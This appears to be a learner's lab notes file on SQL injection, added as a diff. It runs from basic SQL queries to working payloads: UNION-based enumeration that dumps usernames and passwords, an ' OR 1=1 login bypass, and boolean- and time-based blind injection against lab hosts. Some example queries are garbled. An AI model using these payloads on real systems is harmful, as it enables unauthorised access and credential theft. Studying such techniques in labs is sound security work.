@@ -1,0 +1,366 @@
+sqli
+
+SELECT
+select * from users;
+id--
+username--
+password--
+1
+jon
+pass123
+2
+admin
+p4ssword
+3
+martin
+secret123
+
+select username, password from users;
+username--
+password--
+jon
+pass123
+admin
+p4ssword
+martin
+secret123
+
+select * from users LIMIT 1;
+id
+username
+password
+2
+admin
+p4ssword
+
+select * from users where username != 'admin';
+id
+username
+password
+1
+jon
+pass123
+3
+martin
+secret123
+
+
+select * from users where username='admin' or username'join';
+id
+username
+password
+1
+jon
+pass123
+2
+admin
+p4ssword
+
+select * from users where username='admin' and password='p4ssword';
+id
+username
+password
+2
+admin
+p4ssword
+
+select * from users where username like '%n';
+id
+username
+password
+1
+jon
+pass123
+2
+admin
+p4ssword
+3
+martin
+secret123
+
+select * from users where username like '%mi%';
+id
+username
+password
+2
+admin
+p4ssword
+
+// for UNION
+SELECT name, address, city, postcode from customers from customers UNION SELECT company, address, city , postcode from suppliers;
+id
+name
+address
+city
+postcode
+1
+Mr John Smith
+123 Fake Street
+Manchester
+M2 3FJ
+2
+Mrs Jenny Palmer
+99 Green Road
+Birmingham
+B2 4KL
+3
+Miss Sarah Lewis
+15 Fore Street
+London
+NW12 3GH
+And another called suppliers with the following contents:
+
+
+
+id
+company
+address
+city
+postcode
+1
+Widgets Ltd
+Unit 1a, Newby Estate
+Bristol
+BS19 4RT
+2
+The Tool Company
+75 Industrial Road
+Norwich
+N22 3DR
+3
+Axe Makers Ltd
+2b Makers Unit, Market Road
+London
+SE9 1KK
+
+
+now of the 
+name
+address
+city
+postcode
+Mr John Smith
+123 Fake Street
+Manchester
+M2 3FJ
+Mrs Jenny Palmer
+99 Green Road
+Birmingham
+B2 4KL
+Miss Sarah Lewis
+15 Fore Street
+London
+NW12 3GH
+Widgets Ltd	Unit 1a, Newby Estate	Bristol	BS19 4RT
+The Tool Company	75 Industrial Road	Norwich	N22 3DR
+Axe Makers Ltd	2b Makers Unit, Market Road	London	SE9 1KK
+
+
+//inserting the data
+
+
+insert into users (username, password ) values ('bob', 'password123');
+id
+username
+password
+1
+jon
+pass123
+2
+admin
+p4ssword
+3
+martin
+secret123
+4
+bob
+password123
+
+
+UPDATE
+
+update users SET username='root', password='pass123' where username='admin';
+
+id
+username
+password
+1
+jon
+pass123
+2
+root
+pass123
+3
+martin
+secret123
+4
+bob
+password123
+
+
+//Delete 
+delete from users where username='martin';
+
+id
+username
+password
+1
+jon
+pass123
+2
+root
+pass123
+4
+bob
+password123
+
+
+delete from users;
+//will delete every data , only headers are remaining 
+id
+username
+password
+
+
+
+
+// what is SQLI
+//the URL for each blog entry may look something like this:
+https://website.thm/blog?id=1
+//sql statement used for this id parameters and URL would be
+SELECT * from blog where id=1 and private=0 LIMIT 1;
+https://website.thm/blog?id=2;--
+SELECT * from blog where id=2;-- and private=0 LIMIT 1;
+it will be acting like 
+SELECT * from blog where id=2;--
+
+
+
+for cheaking if the SQLI volunebrality is there or not we can cheak by putting ' and " after the id=1 in URL
+if we get an sql error in language that means it has a volnebralities 
+if we get error then try 
+
+1 UNION SELECT 1
+{which we try to gain each users passeword and usernames}
+if error comes then use
+1 UNION SELECT 1,2 
+if this also generate error try 
+1 UNION SELECT 1,2,3
+if it shows no error then
+now we try to get the database name that we have access to:
+0 UNION SELECT 1,2,database()
+now we gets the database name that is let sqli_one
+now our next query will gather a list of tables that are in this database
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+group_concat()gets the specified column(table_name)
+information_schema database, every user of the database has access to this, and it contains information about all the databases and tables the user has access to 
+we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 
+
+0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name ='staff_users'
+
+here we change tables_name to column_name the querying has changed from tables to coloumns, and we're searching for any rows where the table_name column has a value of staff_users
+we get three columns  id,username,password
+we can use it to gain user's info
+
+0 UNION SELECT 1,2,group_concat(username,':', password SEPARATOR '<br>') FROM staff_users
+we used ':' for the seperation of username and passwords and we <br> for each user in seperate line
+
+
+
+
+// BLIND SQLI
+// AUTHENTICATION BYPASS 
+now in this we don't want data from database we want to bypass login
+login is made up like it is'nt interested in content it just wants the matching pair in the users table
+we just need to create a database query that replies with a yes/true.
+
+
+what sql query is going to followed by the web
+select * from users where username='%username%' and password ='%password%' LIMIT 1;
+
+WE CAN PUT FOLLOWING INTO THE PASSWORD 
+
+' OR 1=1;--
+
+act as
+
+select * from users where username='' and password='' OR 1=1;
+ 1=1 is a true 
+
+
+
+
+//BLIND SQLI - Boolean based
+
+browser body contains  {"taken":true} this API endpoint replicate a common feature found on many signup forms, which checks wheather a username has already been registered to prompt the user to choose a different username
+now the SQL query that is processed looks like the following 
+
+select * from users where username = '%username%' LIMIT 1;
+
+in URL LIKE https://website.thm/checkuser?username=admin
+
+we will use 
+https://website.thm/checkuser?username=admin123' UNION SELECT 1;--
+
+and then we will increase adding the coloums 
+https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3;--
+until we get API as true
+
+now our  first task is to discover the database name ;
+by using database()
+
+now trying 
+
+admin123' UNION SELECT 1,2,3 where database() like '%';--
+now we get a true responce 
+now we try using 'a%' and then futher a to z like this 
+admin123' UNION SELECT 1,2,3 where database() like 's%';--
+will give true
+now like this we will improve it  'sa%', 'sb%', 'sc%', etc.
+keep this up untill we get all the character of database 
+which is sqli_three
+We've established the database name, which we can now use to enumerate table names using a similar method by utilising the information_schema database
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema ='sqli_three' and table_name like 'a%';--
+now this try to match tablename in information_schema, it will show false we will have to use all the letters to match the name 
+You'll finally end up discovering a table in the sqli_three database named users
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='user';--
+
+
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
+
+now using payload columns and using the same method we gets like 
+
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+again we have to go through that cycle
+
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+
+now to find username and password like the same we have to use
+
+admin123' UNION SELECT 1,2,3 from users where username like 'a%
+
+and for password 
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+
+we will get username as admin and password as 3845
+
+
+
+
+
+
+// BLIND SQLI - TIME BASED
+
+your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 
+when trying to establish the num of columns in a table, you would use the following query 
+admin123' UNION SELECT SLEEP(5);--
+if there is no pause in the response time , we know that the query was unsuccessful , so like on previous tasks, we add another columns
+
+admin123' UNION SELECT SLEEP(5),2;--
+this payload should have produced a 5 second delay, confirming the successful execution of the UNION statement and that there two columns
+ 
+
+now you can complete eniumberation adding SLEEP() method to UNION SELECT statement
+
+
+
